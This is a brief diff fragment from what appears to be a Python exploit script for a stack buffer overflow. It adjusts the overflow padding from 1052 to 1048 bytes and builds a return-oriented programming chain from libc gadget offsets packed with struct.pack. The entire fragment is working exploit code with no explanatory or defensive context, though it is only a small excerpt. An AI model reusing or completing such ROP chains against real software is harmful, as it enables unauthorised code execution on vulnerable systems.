@@ -16,7 +16,7 @@ g4 = LIBC_OFFSET + 0x1f940 + 0x18f503 + 0xf
 g5 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe
 
 
-shellcode = 'A'*(1052)
+shellcode = 'A'*(1048)
 shellcode += struct.pack('<q', g1)
 shellcode += struct.pack('<q', d1)
 shellcode += struct.pack('<q', g2)
